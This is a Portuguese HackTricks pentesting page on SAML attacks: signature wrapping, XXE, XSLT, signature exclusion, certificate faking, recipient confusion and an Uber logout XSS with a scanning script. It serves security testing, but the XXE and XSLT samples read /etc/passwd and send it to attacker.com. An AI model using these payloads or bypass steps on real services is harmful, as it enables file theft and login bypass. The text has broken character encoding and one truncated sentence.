# Ataques SAML

## Ataques SAML

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Gr√°fico de Ataques

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

## Ferramenta

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Uma ferramenta que pode pegar uma URL ou lista de URLs e retorna a URL de consumo SAML.

## Viagem de ida e volta XML

No XML, a parte assinada do XML √© salva na mem√≥ria, depois algumas codifica√ß√µes/de-codifica√ß√µes s√£o realizadas e a assinatura √© verificada. Idealmente, essa codifica√ß√£o/de-codifica√ß√£o n√£o deveria alterar os dados, mas baseado nesse cen√°rio, **os dados sendo verificados e os dados originais podem n√£o ser os mesmos**.

Por exemplo, confira o seguinte c√≥digo:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Executar o programa contra o REXML 3.2.4 ou vers√µes anteriores resultaria na seguinte sa√≠da:
```
First child in original doc: Y
First child after round-trip: Z
```
Assim √© como o REXML viu o documento XML original do programa acima:

![](<../../.gitbook/assets/image (561).png>)

E assim √© como ele viu ap√≥s uma rodada de an√°lise e serializa√ß√£o:

![](<../../.gitbook/assets/image (562).png>)

Para mais informa√ß√µes sobre a vulnerabilidade e como explor√°-la:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Ataques de Envolvimento de Assinatura XML

Documentos XML contendo Assinaturas XML s√£o tipicamente **processados em dois passos independentes**: **valida√ß√£o da assinatura** e **invoca√ß√£o de fun√ß√£o** (l√≥gica de neg√≥cios). Se ambos os m√≥dulos t√™m vis√µes diferentes sobre os dados, uma nova classe de vulnerabilidades chamada ataques de Envolvimento de Assinatura XML (XSW) existe.\
Nesses ataques, o **advers√°rio** **modifica** a **estrutura da mensagem** **injetando** elementos **falsificados que n√£o invalidam a Assinatura XML**. O objetivo dessa altera√ß√£o √© mudar a mensagem de tal forma que a **l√≥gica da aplica√ß√£o e o m√≥dulo de verifica√ß√£o da assinatura usem partes diferentes da mensagem**. Consequentemente, o receptor verifica a Assinatura XML com sucesso, mas a l√≥gica da aplica√ß√£o processa o elemento falso. O **atacante assim contorna a prote√ß√£o de integridade** e a autentica√ß√£o de origem da Assinatura XML e pode injetar conte√∫do arbitr√°rio.

Da solicita√ß√£o SAML:

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

Um atacante pode **adicionar um novo elemento raiz onde a assinatura** √© encontrada. Portanto, quando o validador verifica a integridade da assinatura, ele pode notar que tem **verificar** a **integridade** do **Response -> Assertion -> Subject**, e pode se confundir com o caminho **malicioso novo Response -> Assertion -> Subject** em vermelho e usar seus dados.

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

A diferen√ßa do #1 √© que o tipo de Assinatura usada √© uma **assinatura destacada** onde o XSW #1 usou uma assinatura envolvente.\
Note como a nova estrutura maliciosa √© a mesma de antes, tentando confundir a l√≥gica de neg√≥cios ap√≥s a verifica√ß√£o de integridade ter sido realizada.

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

Neste ataque, uma **Assertion maliciosa √© criada no mesmo n√≠vel** que a assertion original para tentar confundir a l√≥gica de neg√≥cios e usar os dados maliciosos.

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #4 √© semelhante ao #3, exceto que neste caso a **Assertion original se torna um filho** da Assertion copiada.

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

No XSW #5, a Assinatura e a Assertion original n√£o est√£o em uma das tr√™s configura√ß√µes padr√£o (envolvida/envolvente/desacoplada). Neste caso, a Assertion copiada envolve a Assinatura.

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 insere sua Assertion copiada na mesma localiza√ß√£o que os n√∫meros 4 e 5. A parte interessante aqui √© que a Assertion copiada envolve a Assinatura, que por sua vez envolve a Assertion original.

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 insere um elemento **Extensions** e adiciona a Assertion copiada como **filho**. Extensions √© um elemento XML v√°lido com uma **defini√ß√£o de esquema menos restritiva**. Os autores deste [white paper](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) desenvolveram este m√©todo em resposta √† biblioteca OpenSAML. OpenSAML usou valida√ß√£o de esquema para comparar corretamente o ID usado durante a valida√ß√£o da assinatura com o ID da Assertion processada. Os autores descobriram que em casos onde Assertions copiadas com o mesmo ID da Assertion original eram filhos de um elemento com uma defini√ß√£o de esquema menos restritiva, eles conseguiram contornar essa contramedida espec√≠fica.

![](<../../.gitbook/assets/image (544).png>)

### XSW #8

XSW #8 usa outro elemento XML **menos restritivo** para realizar uma varia√ß√£o do padr√£o de ataque usado no XSW #7. Desta vez, a Assertion original √© o filho do elemento menos restritivo em vez da Assertion copiada.

![](<../../.gitbook/assets/image (545).png>)

### Ferramenta

Voc√™ pode usar a extens√£o do Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para analisar a solicita√ß√£o, aplicar qualquer ataque XSW que escolher e lan√ß√°-lo.

![](<../../.gitbook/assets/image (546).png>)

### Artigo Original

Para mais informa√ß√µes sobre este ataque, leia o artigo original em [https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)

## XXE

Se voc√™ n√£o sabe que tipo de ataques s√£o XXE, por favor leia a seguinte p√°gina:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

Devido ao fato de que as Respostas SAML s√£o documentos XML deflacionados e codificados em base64, podemos testar para **XXE** manipulando o documento XML enviado como a Resposta SAML. Exemplo:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### Ferramenta

Voc√™ tamb√©m pode usar a extens√£o do Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para gerar o POC a partir de uma solicita√ß√£o SAML para testar poss√≠veis vulnerabilidades XXE.

Confira tamb√©m esta palestra: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

Para mais informa√ß√µes sobre XSLT, acesse:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformation (XSLT) √© uma linguagem Turing-completa para transformar documentos XML em outros tipos de documentos, como HTML, JSON ou PDF. Um aspecto importante a ser notado aqui √© que **o ataque n√£o requer uma assinatura v√°lida para ter sucesso**. A raz√£o para isso √© que **a transforma√ß√£o XSLT ocorre antes que a assinatura digital seja processada para verifica√ß√£o**. Basicamente, precisamos de uma Resposta SAML assinada para realizar o ataque, mas a assinatura pode ser autoassinada ou inv√°lida.

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

Aqui voc√™ pode encontrar um **POC** para verificar este tipo de vulnerabilidades, na p√°gina hacktricks mencionada no in√≠cio desta se√ß√£o voc√™ pode encontrar payloads.
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Ferramenta

Voc√™ tamb√©m pode usar a extens√£o do Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para gerar o POC a partir de uma solicita√ß√£o SAML para testar poss√≠veis vulnerabilidades XSLT.

Confira tamb√©m esta palestra: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Exclus√£o de Assinatura XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

A Exclus√£o de Assinatura √© usada para testar como a implementa√ß√£o do SAML se comporta quando **n√£o h√° elemento de Assinatura**. Quando um elemento de Assinatura est√° **ausente**, a **etapa de valida√ß√£o da assinatura pode ser completamente ignorada**. Se a Assinatura n√£o for validada, ent√£o qualquer conte√∫do que normalmente seria assinado pode ser adulterado por um atacante.

![](<../../.gitbook/assets/image (547).png>)

### Ferramenta <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

A exclus√£o de assinatura come√ßa interceptando a Resposta SAML e clicando em `Remove Signatures`. Ao fazer isso, **todos** os elementos de Assinatura s√£o removidos.

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

Com as assinaturas removidas, permita que a solicita√ß√£o prossiga para o alvo. Se a Assinatura n√£o for exigida pelo Servi√ßo

## Falsifica√ß√£o de Certificado <a href="#certificate-faking" id="certificate-faking"></a>

A falsifica√ß√£o de certificado √© o processo de testar se o Provedor de Servi√ßo **verifica se um Provedor de Identidade confi√°vel assinou a Mensagem SAML.** A rela√ß√£o de confian√ßa entre SP e IdP √© estabelecida e **deve ser verificada** cada vez que uma Mensagem SAML √© recebida. Isso se resume a usar um certificado **autoassinado** para assinar a Resposta SAML ou Afirma√ß√£o.

### Ferramenta <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

A extens√£o do Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ser√° usada.\
Para falsificar um certificado, comece interceptando a Resposta SAML.\
Se houver uma Assinatura inclu√≠da na Resposta, use o bot√£o `Send Certificate to SAML Raider Certs`.

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

Ap√≥s enviar o certificado, devemos ver um certificado importado na aba Certificados do SAML Raider. Uma vez l√°, destacamos o certificado importado e pressionamos o bot√£o `Save and Self-Sign`.

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

Ao fazer isso, um clone autoassinado do certificado original √© gerado. Agora √© hora de voltar √† solicita√ß√£o interceptada ainda retida no Proxy do burp. Primeiro, selecione o novo certificado autoassinado no menu suspenso de Assinatura XML. Em seguida, use o bot√£o `Remove Signatures` para remover quaisquer assinaturas existentes. Finalmente, use o bot√£o **`(Re-)Sign Message`** ou `(`**`Re-)Sign Assertion`** (**qualquer** que seja **mais** **apropriado** para a sua situa√ß√£o).

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

Ap√≥s assinar a mensagem com o certificado autoassinado, envie-a. Se nos autenticarmos, sabemos que podemos assinar nossas Mensagens SAML. A capacidade de assinar nossas Mensagens SAML significa que podemos alterar valores na Afirma√ß√£o e eles ser√£o aceitos pelo Provedor de Servi√ßo.

## Confus√£o do Destinat√°rio do Token / Confus√£o do Alvo do Provedor de Servi√ßo <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Confus√£o do Destinat√°rio do Token / Confus√£o do Alvo do Provedor de Servi√ßo **testa se o Provedor de Servi√ßo valida o Destinat√°rio**. Isso significa que, **se a resposta foi destinada a um Provedor de Servi√ßo diferente**, o Provedor de Servi√ßo **atual** deve perceber isso e **rejeitar a autentica√ß√£o**.\
O campo **Destinat√°rio** √© um atributo do elemento **SubjectConfirmationData**, que √© filho do elemento Subject em uma Resposta SAML.

> O elemento SubjectConfirmationData especifica dados adicionais que permitem confirmar o sujeito ou restringir as circunst√¢ncias sob as quais o ato de confirma√ß√£o do sujeito pode ocorrer. A confirma√ß√£o do sujeito ocorre quando uma parte confi√°vel procura verificar a rela√ß√£o entre uma entidade que apresenta a afirma√ß√£o (ou seja, a entidade atestante) e o sujeito das reivindica√ß√µes da afirma√ß√£o.

O atributo Destinat√°rio encontrado no elemento **SubjectConfirmationData √© uma URL que especifica o local para o qual a Afirma√ß√£o deve ser entregue**. Se o Destinat√°rio for um Provedor de Servi√ßo diferente daquele que o recebe, a Afirma√ß√£o n√£o deve ser aceita.

### Como fazer <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

A Confus√£o do Destinat√°rio do Token SAML (SAML-TRC) tem algumas condi√ß√µes pr√©vias para que possamos tentar a explora√ß√£o. Primeiro, **precisamos** ter uma **conta leg√≠tima em um Provedor de Servi√ßo**. Segundo, **SP-Target deve aceitar tokens emitidos pelo mesmo Provedor de Identidade que atende SP-Legit**.

O ataque √© relativamente simples se as condi√ß√µes forem verdadeiras. N√≥s **nos autenticamos** no **SP-Legit** atrav√©s do Provedor de Identidade compartilhado. Em seguida, **interceptamos a Resposta SAML a caminho do IdP para SP-Legit**. Uma vez interceptada, enviamos a **Resposta SAML que foi destinada para SP-Legit para SP-Target em vez disso.** Se **SP-Target aceitar a Afirma√ß√£o**; nos encontraremos logados com o mesmo nome de conta que temos para SP-Legit e teremos acesso aos recursos correspondentes de SP-Target.

## XSS na funcionalidade de Logout

(Acesse a [pesquisa original aqui](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/))

Ap√≥s realizar o brute forcing de diret√≥rios, encontrei a seguinte p√°gina:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
√â uma p√°gina de logout, abri o link acima e fui redirecionado para a seguinte p√°gina
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
O par√¢metro base est√° recebendo uma URL, ent√£o que tal substitu√≠-lo pelo cl√°ssico `javascript:alert(123);` para acionar um XSS.

### Explora√ß√£o em Massa

Usando [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) que pode receber uma lista de URLs e depois devolver a URL de callback (consumo SAML), decidi alimentar a ferramenta com todos os subdom√≠nios de `uberinternal.com` para ver se h√° outros dom√≠nios que usam a mesma biblioteca, e havia.

O que fiz em seguida foi criar um script que chama a p√°gina vulner√°vel `oidauth/prompt` e tenta o XSS e, se minha entrada for refletida, ele me d√° uma mensagem de vulner√°vel agrad√°vel.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Refer√™ncias

Os ataques foram obtidos de [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
Voc√™ pode encontrar recursos adicionais e write-ups em [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
